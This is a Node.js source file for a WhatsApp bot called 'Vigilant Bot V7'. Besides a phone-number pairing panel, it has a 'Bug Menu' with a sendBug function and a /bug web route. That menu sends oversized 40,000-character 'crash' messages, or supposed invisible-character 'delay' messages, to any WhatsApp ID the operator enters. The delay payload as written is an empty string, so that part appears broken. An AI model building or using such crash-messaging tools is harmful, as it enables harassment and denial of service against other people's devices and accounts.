const express = require('express')
const { default: makeWASocket, useMultiFileAuthState, Browsers, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
const fs = require('fs')

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.json())

let sock
let pairingCode = ""
let status = "Waiting for number..."
let isConnected = false

async function startBot(number) {
    const { state, saveCreds } = await useMultiFileAuthState('./session')
    const { version } = await fetchLatestBaileysVersion()

    sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.ubuntu("Chrome"),
        printQRInTerminal: false
    })
    
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        if(connection === 'open') {
            isConnected = true
            status = "Connected ✅"
            pairingCode = ""
        }
        if(connection === 'close') {
            isConnected = false
            const reason = lastDisconnect?.error?.output?.statusCode
            if(reason !== DisconnectReason.loggedOut) {
                status = "Disconnected. Click Restart"
            } else {
                status = "Logged out. Enter number again"
                fs.rmSync('./session', { recursive: true, force: true })
            }
        }
    })
    
    if(!state.creds.registered && number) {
        await new Promise(resolve => setTimeout(resolve, 3000))
        pairingCode = await sock.requestPairingCode(number)
        status = "Code Generated"
    }
}

async function disconnectBot() {
    if(sock) await sock.logout()
    sock = null
    isConnected = false
    status = "Disconnected"
    pairingCode = ""
}

// BUG MENU FUNCTION
async function sendBug(jid, type) {
    if(!isConnected) return "Not connected"
    try {
        if(type === "crash") {
            await sock.sendMessage(jid, { text: "x".repeat(40000) }) // long text bug
        }
        if(type === "delay") {
            await sock.sendMessage(jid, { text: "".repeat(1000) }) // invisible char bug
        }
        return "Bug Sent ✅"
    } catch(e) {
        return "Failed: " + e.message
    }
}

// WEBSITE
app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><title>Vigilant Bot V7</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
        .box{background:#1a1a1a;padding:25px;border-radius:12px;text-align:center;width:90%;max-width:400px;border:1px solid #25D366}
        input{padding:10px;width:90%;border:none;border-radius:8px;margin:8px 0;background:#333;color:#fff}
        button{padding:10px 15px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
        .pair{background:#25D366;color:#000}
        .restart{background:#ff9800;color:#000}
        .disconnect{background:#f44336;color:#fff}
        .bug{background:#9c27b0;color:#fff}
        .code{font-size:22px;font-weight:bold;color:#25D366;margin:15px 0;letter-spacing:2px}
        .status{margin:10px 0;font-size:14px;color:#aaa}
        h2{color:#25D366}
    </style>
    </head>
    <body>
        <div class="box">
            <h2>Vigilant Bot V7</h2>
            
            <form method="POST" action="/pair">
                <p><b>Pairing</b></p>
                <input name="number" placeholder="2348xxxxxxxx" required/>
                <button type="submit" class="pair">Get Pairing Code</button>
            </form>

            <div class="code">${pairingCode ? 'Code: ' + pairingCode : ''}</div>
            <div class="status">Status: ${status}</div>

            <form method="POST" action="/restart" style="display:inline">
                <button type="submit" class="restart">Restart</button>
            </form>
            <form method="POST" action="/disconnect" style="display:inline">
                <button type="submit" class="disconnect">Disconnect</button>
            </form>

            <hr style="margin:20px 0;border-color:#333">
            
            <form method="POST" action="/bug">
                <p><b>Bug Menu</b></p>
                <input name="target" placeholder="Target JID: 2348xxxxxxxx@s.whatsapp.net" required/>
                <select name="type" style="padding:10px;width:90%;border:none;border-radius:8px;margin:8px 0;background:#333;color:#fff">
                    <option value="crash">Crash Bug</option>
                    <option value="delay">Delay Bug</option>
                </select>
                <button type="submit" class="bug">Send Bug</button>
            </form>

            <p style="font-size:12px;margin-top:15px">Pair: WhatsApp > Linked Devices > Link with phone number</p>
        </div>
    </body>
    </html>
    `)
})

app.post('/pair', async (req, res) => {
    const number = req.body.number.replace(/\D/g, '')
    status = "Generating code..."
    pairingCode = ""
    await startBot(number)
    res.redirect('/')
})

app.post('/restart', async (req, res) => {
    await disconnectBot()
    setTimeout(() => { process.exit(1) }, 1000)
})

app.post('/disconnect', async (req, res) => {
    await disconnectBot()
    res.redirect('/')
})

app.post('/bug', async (req, res) => {
    const target = req.body.target
    const type = req.body.type
    status = await sendBug(target, type)
    setTimeout(() => { status = isConnected ? "Connected ✅" : status }, 3000)
    res.redirect('/')
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => console.log(`Vigilant V7 running on ${PORT}`))
